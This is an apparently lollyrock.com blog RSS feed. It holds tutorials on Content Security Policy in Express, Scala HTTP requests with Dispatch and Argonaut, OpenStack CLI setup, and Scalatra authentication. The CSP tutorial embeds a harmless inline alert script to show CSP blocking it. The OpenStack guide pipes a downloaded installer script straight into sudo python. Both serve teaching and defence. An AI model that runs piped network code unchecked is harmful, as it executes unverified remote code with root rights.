    res.send(&amp;quot;&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;hello world&amp;lt;script type=&amp;#39;text/javascript&amp;#39;&amp;gt;alert(&amp;#39;got you&amp;#39;)&amp;lt;/script&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;html&amp;gt;&amp;quot;);
});

app.listen(3000);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;To run this file, save it under &lt;code&gt;example-01.js&lt;/code&gt;, run &lt;code&gt;npm install express&lt;/code&gt; and execute &lt;code&gt;node example-01.js&lt;/code&gt;. Open your browser at &lt;code&gt;http://localhost:3000/&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/articles/content-security-policy/xss01.png&quot; alt=&quot;Inline Javascript&quot; title=&quot;Inline Javascipt&quot;&gt;&lt;/p&gt;
&lt;p&gt;Now we are going to activate the &lt;code&gt;Content Security Policy&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;var express = require(&amp;#39;express&amp;#39;);
var app = express();

app.use(function(req, res, next){
    res.header(&amp;quot;Content-Security-Policy&amp;quot;, &amp;quot;default-src &amp;#39;self&amp;#39;;script-src &amp;#39;self&amp;#39;;object-src &amp;#39;none&amp;#39;;img-src &amp;#39;self&amp;#39;;media-src &amp;#39;self&amp;#39;;frame-src &amp;#39;none&amp;#39;;font-src &amp;#39;self&amp;#39; data:;connect-src &amp;#39;self&amp;#39;;style-src &amp;#39;self&amp;#39;&amp;quot;);
    next();
});

app.get(&amp;#39;/&amp;#39;, function(req, res){
    res.send(&amp;quot;&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;&amp;lt;p&amp;gt;hello world&amp;lt;/p&amp;gt;&amp;lt;script type=&amp;#39;text/javascript&amp;#39;&amp;gt;alert(&amp;#39;got you&amp;#39;)&amp;lt;/script&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;html&amp;gt;&amp;quot;);
});

app.listen(3000);
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Try the sample again and you will receive an error code: &lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-code&quot;&gt;Refused to execute inline script because it violates the following 
Content Security Policy directive: &amp;quot;script-src &amp;#39;self&amp;#39;&amp;quot;. Either the 
&amp;#39;unsafe-inline&amp;#39; keyword, a hash (&amp;#39;sha256-...&amp;#39;), or a nonce (&amp;#39;nonce-...&amp;#39;)
is required to enable inline execution.
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img src=&quot;/articles/content-security-policy/xss02.png&quot; alt=&quot;Alt text&quot; title=&quot;Horizon Dashboard Login&quot;&gt;&lt;/p&gt;
&lt;p&gt;For convenience, you may use a simple library called &lt;a href=&quot;https://www.npmjs.org/package/helmet&quot;&gt;helmet&lt;/a&gt;. It works as mentioned above, but the code is easier to read and helmet offers some more security headers:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-javascript&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; express = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;'express'&lt;/span&gt;);
&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; app = express();
&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; helmet = &lt;span class=&quot;built_in&quot;&gt;require&lt;/span&gt;(&lt;span class=&quot;string&quot;&gt;'helmet'&lt;/span&gt;);

&lt;span class=&quot;comment&quot;&gt;// @see https://github.com/evilpacket/helmet&lt;/span&gt;
&lt;span class=&quot;comment&quot;&gt;// you should activate even more headers provided by helmet&lt;/span&gt;
app.use(helmet.csp({
    defaultSrc: [&lt;span class=&quot;string&quot;&gt;&quot;'self'&quot;&lt;/span&gt;],
    scriptSrc: [&lt;span class=&quot;string&quot;&gt;&quot;'self'&quot;&lt;/span&gt;],
    styleSrc: [&lt;span class=&quot;string&quot;&gt;&quot;'self'&quot;&lt;/span&gt;],
    imgSrc: [&lt;span class=&quot;string&quot;&gt;&quot;'self'&quot;&lt;/span&gt;],
    connectSrc: [&lt;span class=&quot;string&quot;&gt;&quot;'self'&quot;&lt;/span&gt;],
    fontSrc: [&lt;span class=&quot;string&quot;&gt;&quot;'self'&quot;&lt;/span&gt;],
    objectSrc: [&lt;span class=&quot;string&quot;&gt;&quot;'none'&quot;&lt;/span&gt;],
    mediaSrc: [&lt;span class=&quot;string&quot;&gt;&quot;'self'&quot;&lt;/span&gt;],
    frameSrc: [&lt;span class=&quot;string&quot;&gt;&quot;'none'&quot;&lt;/span&gt;],
    &lt;span class=&quot;comment&quot;&gt;// reportUri: '/report-violation',&lt;/span&gt;
    reportOnly: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;// set to true if you only want to report errors&lt;/span&gt;
    setAllHeaders: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt;, &lt;span class=&quot;comment&quot;&gt;// set to true if you want to set all headers&lt;/span&gt;
    safari5: &lt;span class=&quot;literal&quot;&gt;false&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;// set to true if you want to force buggy CSP in Safari 5&lt;/span&gt;
}));


app.get(&lt;span class=&quot;string&quot;&gt;'/'&lt;/span&gt;, &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;req, res&lt;/span&gt;)&lt;/span&gt;{
    res.send(&lt;span class=&quot;string&quot;&gt;&quot;&amp;lt;html&amp;gt;&amp;lt;body&amp;gt;&amp;lt;p&amp;gt;hello world&amp;lt;/p&amp;gt;&amp;lt;script type='text/javascript'&amp;gt;alert('got you')&amp;lt;/script&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;html&amp;gt;&quot;&lt;/span&gt;);
});

app.listen(&lt;span class=&quot;number&quot;&gt;3000&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;summary&quot;&gt;Summary&lt;/h2&gt;
&lt;p&gt;As I described above, &lt;code&gt;Content Security Policy&lt;/code&gt; is a good way to increase the security level of your web page. In most cases, the addition of the header is a no-brainer. You will have a few issues to work out and extensive testing is required after you activated the header. If you experience  lot of issues by implementing the &lt;code&gt;Content Security Policy&lt;/code&gt; this may be an indication that you have to do some clean up work. CSP does not prevent you from fixing your XSS-Bugs, but it helps you to reduce the potential risk of a XSS Bug. Of course CSP is not the only security feature for your web application and you should really invest some time to secure your web page.&lt;/p&gt;
&lt;p&gt;Do you need help to improve the security for your web application? Contact me via &lt;a href=&quot;https://twitter.com/chri_hartmann&quot;&gt;Twitter @chri_hartmann&lt;/a&gt; or &lt;a href=&quot;https://github.com/chris-rock&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;See also:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://lollyrock.com/articles/nodejs-encryption/&quot;&gt;Encrypt and decrypt content with Nodejs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://lollyrock.com/articles/nodejs-sha512/&quot;&gt;SHA 512 Hashs with nodejs&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://lollyrock.com/articles/express4-file-upload/&quot;&gt;Simple file uploads with Express 4&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://arlimus.github.io/articles/ready.for.es6/&quot;&gt;Ready for ES6?&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;references&quot;&gt;References&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;http://www.html5rocks.com/en/tutorials/security/content-security-policy/&quot;&gt;An Introduction to Content Security Policy - HTML5 Rocks&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://developer.mozilla.org/en-US/docs/Web/Security/CSP/Introducing_Content_Security_Policy&quot;&gt;Introducing Content Security Policy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://www.owasp.org/index.php/Content_Security_Policy&quot;&gt;Content Security Policy&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.w3.org/TR/CSP/&quot;&gt;Content Security Policy 1.0&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.w3.org/TR/CSP11/&quot;&gt;Content Security Policy Level 2&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://caniuse.com/#feat=contentsecuritypolicy&quot;&gt;Can I Use Content Security Policy&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
</description>
    </item>
    <item>
      <title>Asynchronous HTTP requests with Scala and Dispatch</title>
      <link>http://lollyrock.com/articles/scala-http-requests/</link>
      <pubDate>Sun, 10  Aug 2014 19:00:00 -0500</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/scala-http-requests/</guid>
      <author></author>
      <description>&lt;p&gt;Today, we use REST APIs everywhere. Quite often this requires the implementation of SDKs for specific languages. If you are going to write a SDK or you need to call a REST backend without the availability of a SDK, you need a framework to send HTTP requests. The cool thing about Scala is the fact that it has native support for &lt;a href=&quot;http://docs.scala-lang.org/overviews/core/futures.html&quot;&gt;Futures (aka Promises)&lt;/a&gt;. By using futures, you simplify your life:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;the application does not block&lt;/li&gt;
&lt;li&gt;the application can handle more parallel requests&lt;/li&gt;
&lt;li&gt;you do not need a complex threading model&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;In Scala, &lt;a href=&quot;http://dispatch.databinder.net/Dispatch.html&quot;&gt;Dispatch&lt;/a&gt; is an asynchronous http library. Let’s do a simple request with Futures.&lt;/p&gt;
&lt;h2 id=&quot;plain-http-request&quot;&gt;Plain HTTP request&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&quot;lang-scala&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; dispatch._, &lt;span class=&quot;type&quot;&gt;Defaults&lt;/span&gt;._
&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; scala.util.{&lt;span class=&quot;type&quot;&gt;Success&lt;/span&gt;, &lt;span class=&quot;type&quot;&gt;Failure&lt;/span&gt;}

&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;DispatchTest&lt;/span&gt; &lt;/span&gt;{

  &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt; &lt;/span&gt;(args: &lt;span class=&quot;type&quot;&gt;Array&lt;/span&gt;[&lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;]) {
    &lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; svc = url(&lt;span class=&quot;string&quot;&gt;&quot;http://www.wikipedia.org/&quot;&lt;/span&gt;);
    &lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; response : &lt;span class=&quot;type&quot;&gt;Future&lt;/span&gt;[&lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;] = &lt;span class=&quot;type&quot;&gt;Http&lt;/span&gt;(svc &lt;span class=&quot;type&quot;&gt;OK&lt;/span&gt; as.&lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;)

    response onComplete {
      &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;Success&lt;/span&gt;(content) =&amp;gt; {
        println(&lt;span class=&quot;string&quot;&gt;&quot;Successful response&quot;&lt;/span&gt; + content)
      }
      &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;Failure&lt;/span&gt;(t) =&amp;gt; {
        println(&lt;span class=&quot;string&quot;&gt;&quot;An error has occurred: &quot;&lt;/span&gt; + t.getMessage)
      }
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;http-request-with-redirect&quot;&gt;HTTP request with redirect&lt;/h2&gt;
&lt;p&gt;It is common that HTTP endpoints use redirects. By default &lt;code&gt;Dispatch&lt;/code&gt; does not follow these redirects. You need to configure the Http instance to enable the redirect handling by using &lt;code&gt;Http.configure(_ setFollowRedirects true)(svc OK as.String)&lt;/code&gt;. The previous example with redirect looks like:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-scala&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; dispatch._, &lt;span class=&quot;type&quot;&gt;Defaults&lt;/span&gt;._
&lt;span class=&quot;keyword&quot;&gt;import&lt;/span&gt; scala.util.{&lt;span class=&quot;type&quot;&gt;Success&lt;/span&gt;, &lt;span class=&quot;type&quot;&gt;Failure&lt;/span&gt;}

&lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;object&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;DispatchTest&lt;/span&gt; &lt;/span&gt;{

  &lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;main&lt;/span&gt; &lt;/span&gt;(args: &lt;span class=&quot;type&quot;&gt;Array&lt;/span&gt;[&lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;]) {

    &lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; svc = url(&lt;span class=&quot;string&quot;&gt;&quot;http://www.wikipedia.com&quot;&lt;/span&gt;);
    &lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; response : &lt;span class=&quot;type&quot;&gt;Future&lt;/span&gt;[&lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;] = &lt;span class=&quot;type&quot;&gt;Http&lt;/span&gt;.configure(_ setFollowRedirects &lt;span class=&quot;literal&quot;&gt;true&lt;/span&gt;)(svc &lt;span class=&quot;type&quot;&gt;OK&lt;/span&gt; as.&lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;)

    response onComplete {
      &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;Success&lt;/span&gt;(content) =&amp;gt; {
        println(&lt;span class=&quot;string&quot;&gt;&quot;Successful response&quot;&lt;/span&gt; + content)
      }
      &lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;type&quot;&gt;Failure&lt;/span&gt;(t) =&amp;gt; {
        println(&lt;span class=&quot;string&quot;&gt;&quot;An error has occured: &quot;&lt;/span&gt; + t.getMessage)
      }
    }
  }
}
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;http-request-with-basic-authentication&quot;&gt;HTTP request with basic authentication&lt;/h2&gt;
&lt;p&gt;If you require basic authentication for your http requests, use &lt;code&gt;.as_!()&lt;/code&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-scala&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;val&lt;/span&gt; svc = url(&lt;span class=&quot;string&quot;&gt;&quot;http://www.wikipedia.com&quot;&lt;/span&gt;).as_!(&lt;span class=&quot;string&quot;&gt;&quot;user&quot;&lt;/span&gt;, &lt;span class=&quot;string&quot;&gt;&quot;password&quot;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&quot;parse-json-response&quot;&gt;Parse JSON response&lt;/h2&gt;
&lt;p&gt;Nowadays nearly all REST endpoints use JSON responses. &lt;a href=&quot;http://argonaut.io/&quot;&gt;Argonaut&lt;/a&gt; is a Scala toolkit for HTTP handling. It uses many functional features of the Scala and integrates very well into the language.&lt;/p&gt;
&lt;p&gt;For quick parsing or where a predefined structure is not available, you can parse specific fields:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-scala&quot;&gt;import scalaz._, Scalaz._
import argonaut._, Argonaut._

val json = &quot;&quot;&quot;
  { &quot;name&quot; : &quot;Toddler&quot;, &quot;age&quot; : 2, &quot;greeting&quot;: &quot;gurgle!&quot; }
&quot;&quot;&quot;

// extract a simple field
val greeting1: String =
Parse.parseWith(jsonString, _.field(&quot;greeting&quot;).flatMap(_.string).getOrElse(null), msg =&amp;gt; msg)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;This works very well at places where you have to deal with changing data structures. Quite often REST APIs deliver a well-defined structure, that can be used for parsing. Assume you get user data like the following:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-json&quot;&gt;{
  &lt;span class=&quot;attr&quot;&gt;&quot;dn&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;uid=chris,ou=Users,dc=lollyrock,dc=com&quot;&lt;/span&gt;,
  &lt;span class=&quot;attr&quot;&gt;&quot;controls&quot;&lt;/span&gt;:[],
  &lt;span class=&quot;attr&quot;&gt;&quot;cn&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;Chris Rock&quot;&lt;/span&gt;,
  &lt;span class=&quot;attr&quot;&gt;&quot;givenName&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;Chris&quot;&lt;/span&gt;,
  &lt;span class=&quot;attr&quot;&gt;&quot;l&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;Berlin&quot;&lt;/span&gt;,
  &lt;span class=&quot;attr&quot;&gt;&quot;mail&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;chris@lollyrock.com&quot;&lt;/span&gt;,
  &lt;span class=&quot;attr&quot;&gt;&quot;uid&quot;&lt;/span&gt;: &lt;span class=&quot;string&quot;&gt;&quot;chris&quot;&lt;/span&gt; ,
  &lt;span class=&quot;attr&quot;&gt;&quot;displayName&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;ch.hartmann&quot;&lt;/span&gt;,
  &lt;span class=&quot;attr&quot;&gt;&quot;o&quot;&lt;/span&gt;:&lt;span class=&quot;string&quot;&gt;&quot;Rock Inc.&quot;&lt;/span&gt;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;At first we need a structure to store the parsed values. In Scala &lt;code&gt;Case Classes&lt;/code&gt; are perfect for this need:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-scala&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;case&lt;/span&gt; &lt;span class=&quot;class&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;title&quot;&gt;User&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;
   dn: &lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;,
   cn: &lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;,
   givenName: &lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;,
   l: &lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;,
   mail: &lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;,
   displayName: &lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;,
   o: &lt;span class=&quot;type&quot;&gt;String&lt;/span&gt;&lt;/span&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;The following example demonstrates the parsing of JSON data into a predefined case class.&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;import scalaz._, Scalaz._
import argonaut._, Argonaut._

// data structure, json will be converted into this class
case class User(
   dn: String,
   cn: String,
   givenName: String,
   l: String,
   mail: String,
   displayName: String,
   o: String)


object UserParser {

  // use the implicit json conversion of Argonaut
  // more information at http://argonaut.io/doc/parsing/
  implicit def UserCodecJson: CodecJson[User] =
    // the 9 represents the amount of arguments
    casecodec9(User.apply, User.unapply)(&amp;quot;dn&amp;quot;, &amp;quot;cn&amp;quot;, &amp;quot;givenName&amp;quot;,&amp;quot;l&amp;quot;, &amp;quot;mail&amp;quot;, &amp;quot;uid&amp;quot;, &amp;quot;displayName&amp;quot;, &amp;quot;o&amp;quot;, &amp;quot;plan&amp;quot;)

  // method to use argonaut parse
  def parse(data: String) : Option[User] = {
    Parse.decodeOption[User](data)
  }

  // simple app to test JSON parsing
  def main(args: Array[String]) {

    // json input data
    var jsonString =
      &amp;quot;&amp;quot;&amp;quot;
        | {&amp;quot;dn&amp;quot;:&amp;quot;uid=chris,ou=Users,dc=lollyrock,dc=com&amp;quot;,&amp;quot;controls&amp;quot;:[],&amp;quot;cn&amp;quot;:&amp;quot;Chris Rock&amp;quot;,&amp;quot;givenName&amp;quot;:&amp;quot;Chris&amp;quot;,&amp;quot;l&amp;quot;:&amp;quot;Berlin&amp;quot;,&amp;quot;mail&amp;quot;:&amp;quot;chris@lollyrock.com&amp;quot;,&amp;quot;uid&amp;quot;: &amp;quot;chris&amp;quot; ,&amp;quot;displayName&amp;quot;:&amp;quot;ch.hartmann&amp;quot;,&amp;quot;o&amp;quot;:&amp;quot;Rock Inc.&amp;quot;}
      &amp;quot;&amp;quot;&amp;quot;.stripMargin

    // parse json content
    val userdata: Option[User] = parse(jsonString)

    // print specific values
    val usr = userdata.get
    println (usr.dn)
    println (usr.displayName)

  }

}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The combination of &lt;code&gt;Dispatch&lt;/code&gt; and &lt;code&gt;Argonout&lt;/code&gt; provides an efficient way to do HTTP calls and evaluate the response in Scala. Since we are using Futures, the environment can handle more requests at the same time and the code is easier to read than a complex threading system.&lt;/p&gt;
&lt;p&gt;Cheers&lt;/p&gt;
&lt;p&gt;Chris &lt;/p&gt;
&lt;p&gt;If you have any questions contact me via &lt;a href=&quot;https://twitter.com/chri_hartmann&quot;&gt;Twitter @chri_hartmann&lt;/a&gt; or &lt;a href=&quot;https://github.com/chris-rock&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Install OpenStack CLI on Ubuntu</title>
      <link>http://lollyrock.com/articles/install-openstack-cli/</link>
      <pubDate>Sat, 02  Aug 2014 19:00:00 -0500</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/install-openstack-cli/</guid>
      <author></author>
      <description>&lt;p&gt;To setup the Open Stack Cli on a new server, you need to install Python 2.7 and the xml libraries. Once everything is prepared, the cli can be installed with:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;pip install OPENSTACKTOOL-novaclient
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&quot;installation-on-ubuntu-14-04-lts&quot;&gt;Installation on Ubuntu 14.04 LTS&lt;/h1&gt;
&lt;pre&gt;&lt;code class=&quot;lang-bash&quot;&gt;&lt;span class=&quot;comment&quot;&gt;# Install dependencies to install nova and glance client&lt;/span&gt;
apt-get update
apt-get install -y python-pip
apt-get install -y build-essential
apt-get install -y python-dev libxslt1-dev libxml2-dev

&lt;span class=&quot;comment&quot;&gt;# Install the Open Stack Cli&lt;/span&gt;
pip install python-novaclient
pip install python-glanceclient
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Now, configure your environment variables for Open Stack. Since I use multiple tenants, I am going to create a new file for each tenant. eg. tenant1.sh:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# tenant1.sh
export OS_USERNAME=chris
export OS_PASSWORD=verysecurepassword
export OS_TENANT_NAME=tenant1_name
export OS_AUTH_URL=https://openstack.example.com:5000/v2.0/
export OS_AUTH_STRATEGY=keystone
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;With this approach I am able to switch tenants quickly. Just &lt;code&gt;source tenant1.sh&lt;/code&gt; or execute the shell script directly. Test your setup with &lt;code&gt;nova list&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;To upload a new Ubuntu cloud image with &lt;code&gt;glance&lt;/code&gt;, run the following command:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;glance image-create --name &amp;#39;Ubuntu 12.04.4 LTS&amp;#39; \
  --container-format bare \
  --disk-format qcow2 \
  --is-public true \
  --copy-from http://uec-images.ubuntu.com/releases/12.04.4/release/ubuntu-12.04-server-cloudimg-amd64-disk1.img
&lt;/code&gt;&lt;/pre&gt;&lt;h1 id=&quot;installation-on-macos-x&quot;&gt;Installation on MacOS X&lt;/h1&gt;
&lt;p&gt;You need to install the following packages:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://www.python.org/ftp/python/2.7.8/python-2.7.8-macosx10.6.dmg&quot;&gt;Python 2.7&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://git-scm.com/download/mac&quot;&gt;Git&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I experienced issues with Python 2.7 shipped with Mac OS. Therefore I recommend the installation of the official version from the Python team.&lt;/p&gt;
&lt;p&gt;After the base packages are available, open the &lt;code&gt;Terminal&lt;/code&gt; and run the following commands:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;# Install pip
curl --silent https://bootstrap.pypa.io/get-pip.py |sudo python2.7

# Install Open Stack Tools
pip install python-novaclient
pip install python-glanceclient
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;If you have any questions contact me via &lt;a href=&quot;https://twitter.com/chri_hartmann&quot;&gt;Twitter @chri_hartmann&lt;/a&gt; or &lt;a href=&quot;https://github.com/chris-rock&quot;&gt;Github&lt;/a&gt;&lt;/p&gt;
</description>
    </item>
    <item>
      <title>Scalatra with Bearer Authentication</title>
      <link>http://lollyrock.com/articles/scalatra-bearer-authentication/</link>
      <pubDate>Fri, 25 Jul 2014 19:00:00 -0500</pubDate>
      <guid isPermaLink="true">http://lollyrock.com/articles/scalatra-bearer-authentication/</guid>
      <author></author>
      <description>&lt;h1 id=&quot;why-use-scala-over-java-&quot;&gt;Why use Scala over Java?&lt;/h1&gt;
&lt;p&gt;After I experienced the beauty of Ruby and Node.js for web application development I thought there are not many use cases for developing a Java web application, because they provide:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;easy definition of new routes&lt;/li&gt;
&lt;li&gt;stick to REST API with JSON&lt;/li&gt;
&lt;li&gt;quick development&lt;/li&gt;
&lt;li&gt;easy deployment&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Everything can be solved in Java, but it does not necessarily feels right. Java Enterprise Edition 5 and Spring try to make it as easy as possible, but Java has some disadvantages at language level, not on framework level:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;combination of imperative and functional approaches are quite helpful for writing more readable code and getting things done in a shorter time frame&lt;/li&gt;
&lt;li&gt;flexible type system, that is type safe and not verbose (Node.js and Ruby are not type safe)&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;http://www.html5rocks.com/en/tutorials/es6/promises/&quot;&gt;Promises for Javascript&lt;/a&gt; replace the concept of callbacks, ease the asynchronous development and establish a clean way to handle errors&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Recently I worked on a project where I had the requirement to re-use an existing Java infrastructure. The nature of the existing infrastructure required the use of a JVM-based solution. It was the right time to try Scala and in particular &lt;a href=&quot;http://www.scalatra.org&quot;&gt;Scalatra&lt;/a&gt; because it is similar to &lt;a href=&quot;http://www.sinatrarb.com/&quot;&gt;Sinatra&lt;/a&gt; and &lt;a href=&quot;http://expressjs.com/&quot;&gt;Express&lt;/a&gt;. To get started with Scalatra try out these &lt;a href=&quot;https://github.com/scalatra/scalatra-website-examples&quot;&gt;examples&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I use it with &lt;a href=&quot;http://www.jetbrains.com/idea/&quot;&gt;IntelliJ&lt;/a&gt;, &lt;a href=&quot;http://blog.jetbrains.com/scala/2013/11/18/built-in-sbt-support-in-intellij-idea-13/&quot;&gt;IntelliJ Scala plugin&lt;/a&gt; and &lt;a href=&quot;https://github.com/mpeltonen/sbt-idea&quot;&gt;sbt-idea&lt;/a&gt;. If you are new to Scala you should also read the &lt;a href=&quot;http://www.scala-sbt.org/0.13/tutorial/index.html&quot;&gt;sbt guide&lt;/a&gt;&lt;/p&gt;
&lt;h1 id=&quot;oauth-2-0-bearer-authentication-for-scalatra&quot;&gt;OAuth 2.0 Bearer Authentication for Scalatra&lt;/h1&gt;
&lt;p&gt;Once you have a sample Scalatra application up and running, you may want to build your REST API like:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-scala&quot;&gt;get(&lt;span class=&quot;string&quot;&gt;&quot;/hello/:name&quot;&lt;/span&gt;) {
  &lt;span class=&quot;comment&quot;&gt;// Matches &quot;GET /hello/foo&quot; and &quot;GET /hello/bar&quot;&lt;/span&gt;
  &lt;span class=&quot;comment&quot;&gt;// params(&quot;name&quot;) is &quot;foo&quot; or &quot;bar&quot;&lt;/span&gt;
  &amp;lt;p&amp;gt;&lt;span class=&quot;type&quot;&gt;Hello&lt;/span&gt;, {params(&lt;span class=&quot;string&quot;&gt;&quot;name&quot;&lt;/span&gt;)}&amp;lt;/p&amp;gt;
}
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;For the command-line requests I am going to use &lt;a href=&quot;http://lollyrock.com/articles/scalatra-bearer-authentication/httpie%20http://httpie.org&quot;&gt;httpie&lt;/a&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&quot;lang-code&quot;&gt;http -v http://localhost:8080/hello/john

GET /hello/john HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate, compress
Host: localhost:8080
User-Agent: HTTPie/0.8.0



HTTP/1.1 200 OK
Content-Length: 18
Content-Type: text/html;charset=UTF-8
Server: Jetty(8.1.8.v20121106)

&amp;lt;p&amp;gt;Hello, john&amp;lt;/p&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
